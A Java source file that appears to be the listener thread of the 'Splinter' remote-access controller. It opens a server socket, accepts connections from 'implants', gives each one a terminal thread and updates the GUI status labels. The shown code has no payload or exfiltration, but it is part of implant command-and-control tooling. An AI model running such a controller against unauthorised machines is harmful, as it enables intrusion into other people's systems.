/**
 * This is the main ServerSocket thread listening for new connections.  Each connection will be thrown into a new terminal thread
 * 
 *  @author Solomon Sonya
 */

package Controller.Thread;

import Controller.GUI.*;
import Controller.Drivers.Drivers;
import Implant.Driver;

import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;
import java.awt.*;

public class Thread_ServerSocket extends Thread implements Runnable
{
	String strMyClassName = "Thread_ServerSocket";
	
	public static int svrSocketPort = -1;
	public volatile InetAddress localhost = null;
	public volatile ServerSocket svrSocket = null;
	public volatile String serverAddr ="";
	public volatile InetAddress bindAddress = null;
	
	public  volatile Thread_Terminal terminal = null;
	
	static public String ControllerIP = ""; 
		
	public volatile boolean serverSocketRunning = false; 
	
	
	
	static JLabel jlblStatusLabel = null, jlblEstablishedPortNum = null, jlblNumConnectedImplants, jlblServerIP = null;
	
	public volatile boolean keepServerSocketOpen = true;
	
	public Thread_ServerSocket(int port, InetAddress bind_IP_Address, JLabel statusLabel, JLabel establishedPort, JLabel connectedImplants, JLabel lhost)
	{
		try
		{
			//set variables here
			jlblStatusLabel = statusLabel;
			jlblEstablishedPortNum = establishedPort;
			svrSocketPort = port;
			jlblNumConnectedImplants = connectedImplants;
			jlblServerIP = lhost;
			bindAddress = bind_IP_Address;
		}
		catch(Exception e)
		{
			Drivers.eop("Thread_ServerSocket Constructor", strMyClassName, e, "", false);
		}
		
	}
	
	public void run()
	{
		boolean establishSocket = true;
		//ensure variables are set
		if(jlblStatusLabel == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(jlblEstablishedPortNum == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Port Number is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(svrSocketPort < 1 || svrSocketPort > 65534)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Socket Port is out of range", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		if(jlblNumConnectedImplants == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Status Implant Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}			
		
		if(jlblServerIP == null)
		{
			Drivers.jop_Error("Unable to start ServerSocket.  Server IP Label is not set", "Can not Start ServerSocket");
			establishSocket = false;
		}
		
		
		//all vars set, establish the server socket
		if(establishSocket)
		{
			Drivers.indicateServerSocketStatus_Closed();
			
			establishServerSocket(svrSocketPort, bindAddress);					
		}
		else
		{
			Drivers.sop("Unable to start ServerSocket. Error was displayed to user");
		}
		
		
		
		/*******************************************
		 * 
		 * INFINITE WHILE FOR NEW CONNECTIONS!
		 * 
		 ******************************************/
		while(keepServerSocketOpen)
		{
			Socket sckClientSocket = null;
			try
			{
				//forever wait until a new connection is established, once a new connection is received, spawn a new 
				sckClientSocket = svrSocket.accept();
				
				//we just got here, new socket is established. bind socket to new thread to correspond to implant
				Thread_Terminal terminal = new Thread_Terminal(false, false, false, sckClientSocket);//it is unknown at this time the type of implant connected, thus, say all are false
				terminal.start();				
				
				//"link" the thread to the arraylist
				/*Drivers.alTerminals.add(terminal);
												
				//update number connected agents
				Drivers.updateConnectedImplants();
				Drivers.jtblConnectedImplants.updateJTable = true;*/
				
				//that is all, loop back to the top to wait to accept the next connection
			}
						
			
			catch(SocketException se)
			{
				Drivers.sop("ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
				keepServerSocketOpen = false;
				break;
			}
			
			
			catch(Exception e)
			{
				Drivers.eop("ServerSocket thead run", strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
				//keepServerSocketOpen = false;
			}
			
			//We break out when the server socket is no longer running. indicate accordingly
			/*this.jlblEstablishedPortNum.setText("CLOSED");
			this.jlblServerIP.setText("OFFLINE");
			this.jlblStatusLabel.setText("OFFLINE");*/
		}
		
		//Drivers.indicateServerSocketStatus_Closed();
		update_gui();
	}
	
	public boolean update_gui()
	{
		//now check the state of all server sockets
		try
		{
			
			
			/*for(int i = 0; Splinter_GUI.llThread_ServerSockets != null && i < Splinter_GUI.llThread_ServerSockets.size(); i++)
			{
				//first remove inactive server sockets
				if(!Splinter_GUI.llThread_ServerSockets.get(i).serverSocketRunning || !Splinter_GUI.llThread_ServerSockets.get(i).keepServerSocketOpen )
				{
					Splinter_GUI.llThread_ServerSockets.remove(i);
				}
			}*/
			
			
			
			//now update data to user
			if((Splinter_GUI.thdServerSocket == null || !Splinter_GUI.thdServerSocket.keepServerSocketOpen || !Splinter_GUI.thdServerSocket.serverSocketRunning) && Splinter_GUI.llThread_ServerSockets.size() < 1)
			{
				Drivers.indicateServerSocketStatus_Closed();
			}
			else if(Splinter_GUI.llThread_ServerSockets.size() == 1)
			{
				Splinter_GUI.jlblEstablishedPort.setText("" + Splinter_GUI.newPort);
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblLHOST_ME_IP.setText(Splinter_GUI.llThread_ServerSockets.get(0).bindAddress.getHostAddress());
				
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblServerSocketStatus.setBackground(Color.green.darker());
				
				
				Splinter_GUI.llThread_ServerSockets.get(0);
				Splinter_GUI.server_socket_listening_implant_ports_tooltip = "<html><b><u>Listening PORT:</b></u><br>" + Splinter_GUI.llThread_ServerSockets.get(0).bindAddress + " : " + Thread_ServerSocket.svrSocketPort;
				Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip = "<html><b><u>Listening IP Address:</b></u><br>" + Splinter_GUI.llThread_ServerSockets.get(0).bindAddress;
				
			}
			else if(Splinter_GUI.thdServerSocket != null && Splinter_GUI.thdServerSocket.serverSocketRunning && Splinter_GUI.thdServerSocket.keepServerSocketOpen && Splinter_GUI.llThread_ServerSockets.size() < 1)
			{
				Splinter_GUI.jlblEstablishedPort.setText("" + Splinter_GUI.newPort);
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblLHOST_ME_IP.setText(Splinter_GUI.thdServerSocket.bindAddress.getHostAddress());
				Splinter_GUI.jlblServerSocketStatus.setBackground(Color.green.darker());
				
				//Splinter_GUI.llThread_ServerSockets.get(0);
				Splinter_GUI.server_socket_listening_implant_ports_tooltip = "<html><b><u>Listening PORTS:</b></u><br>" + Splinter_GUI.thdServerSocket.bindAddress + " : " + Thread_ServerSocket.svrSocketPort;
				Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip = "<html><b><u>Listening IP Addresses:</b></u><br>" + Splinter_GUI.thdServerSocket.bindAddress;
			}
			else if(Splinter_GUI.llThread_ServerSockets.size() > 1)
			{
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblServerSocketStatus.setBackground(Color.green.darker());
				
				Splinter_GUI.jlblEstablishedPort.setText("" + "MULTIPLE");
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblLHOST_ME_IP.setText("MULTIPLE");
				Splinter_GUI.jlblServerSocketStatus.setBackground(Color.green.darker());
				
				//SET TOOL TIPS
				Splinter_GUI.server_socket_listening_implant_ports_tooltip = "<html><b><u>Listening PORTS:</b></u><br>";
				Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip = "<html><b><u>Listening IP Addresses:</b></u><br>";
				for(int i = 0; i < Splinter_GUI.llThread_ServerSockets.size(); i++)
				{
					Splinter_GUI.llThread_ServerSockets.get(i);
					Splinter_GUI.server_socket_listening_implant_ports_tooltip = Splinter_GUI.server_socket_listening_implant_ports_tooltip + "<br>" + Splinter_GUI.llThread_ServerSockets.get(i).bindAddress + " : " + Thread_ServerSocket.svrSocketPort;
					Splinter_GUI.llThread_ServerSockets.get(i);
					Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip = Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip + "<br>" + Splinter_GUI.llThread_ServerSockets.get(i).bindAddress + " : " + Thread_ServerSocket.svrSocketPort;  
				}
			}
			else
			{
				Splinter_GUI.server_socket_listening_implant_ports_tooltip = "";
				Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip = "";  
				
				Drivers.sop(">>> Msg: no server socket open!");
				Drivers.indicateServerSocketStatus_Closed();
			}
			
			
			//set the tooltips
			if(!Splinter_GUI.server_socket_listening_implant_ports_tooltip.trim().equals(""))
			{
				Splinter_GUI.jlblServerSocketStatus.setText("RUNNING");
				Splinter_GUI.jlblServerSocketStatus.setBackground(Color.green.darker());
			}
			
			Splinter_GUI.jlblEstablishedPort.setToolTipText(Splinter_GUI.server_socket_listening_implant_ports_tooltip);
			Splinter_GUI.jlblServerSocketStatus.setToolTipText(Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip);
			Splinter_GUI.jlblLHOST_ME_IP.setToolTipText(Splinter_GUI.server_socket_listening_implant_IP_addresses_tooltip);
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("update_gui", strMyClassName, e, "", false);
		}
		
		return false;
		
	}
	
	public boolean establishServerSocket(int prt, InetAddress bind_IP_Addr)
	{
		try
		{
			serverSocketRunning = false;
			keepServerSocketOpen = false;
			
			//Establish ServerSocket and bind to Port
			try
			{
				if(bind_IP_Addr == null)
				{
					Driver.sop("Bind IP Address not specified, attempting to establish serversocket on default interface...");
					svrSocket = new ServerSocket(prt);
				}
				else
				{
					svrSocket = new ServerSocket(prt, 0, bind_IP_Addr);
				}
			}
			catch(SocketException se)
			{
				Drivers.jop_Error("ServerSocket is unable to bind to port " + bind_IP_Addr + " : " + prt + ".\nPerhaps this port is occupied.                                   \n\nPlease try a different port", "ServerSocket NOT ESTABLISHED - Unable to bind to port" + prt);
				Drivers.sop("Unable to bind to port " + bind_IP_Addr + " : " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
				
				try
				{
					if(Splinter_GUI.llThread_ServerSockets.contains(this))
					{
						Splinter_GUI.llThread_ServerSockets.remove(this);
					}
				}catch(Exception e){}
				
				update_gui();
				
				return false;
			}
			
			//Set the IP address
			//localhost = InetAddress.getLocalHost();
			localhost = svrSocket.getInetAddress();
			
			Thread_ServerSocket.jlblEstablishedPortNum.setText("" + prt);
			Thread_ServerSocket.jlblStatusLabel.setText("RUNNING");
			Thread_ServerSocket.jlblServerIP.setText(localhost.getHostAddress());
			jlblStatusLabel.setBackground(Color.green.darker());
			
			ControllerIP = localhost.getHostAddress();
			
			String success = 	" * * * * * ServerSocket Established at " +Drivers.getTimeStamp_Without_Date() + " * * * * *\n" + 
								"Server HostName: " + localhost.getHostName() + "\n" + 
								"Server IP: " + localhost.getHostAddress() + "\n" + 
								"Listening for Implants on Port: " + prt;
			
			Drivers.sop("");
			Drivers.sop(success);
			
			keepServerSocketOpen = true;
			
			//jlblStatusLabel.setBackground(Color.green.darker());
			
			Drivers.jop_Warning(success, "ServerSocket Established");
			
			
			
			serverSocketRunning = true;
			
			/**
			 * solo, think of resolving external ip using the following code: //add button
			 * 
			 * URL myIP = new URL("http://checkip.amazonaws.com");
			 * BufferedReader brURL = new BufferedReader(new InputStreamReam(myIP.openStream()));
			 * String line = brURL.readLine();
			 * brURL.close(); 
			 * 
			 */
			
			update_gui();
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("establishServerSocket", strMyClassName, e, "Unable to maintain established server socket", false);
		}
		
		return false;
	}
	
}
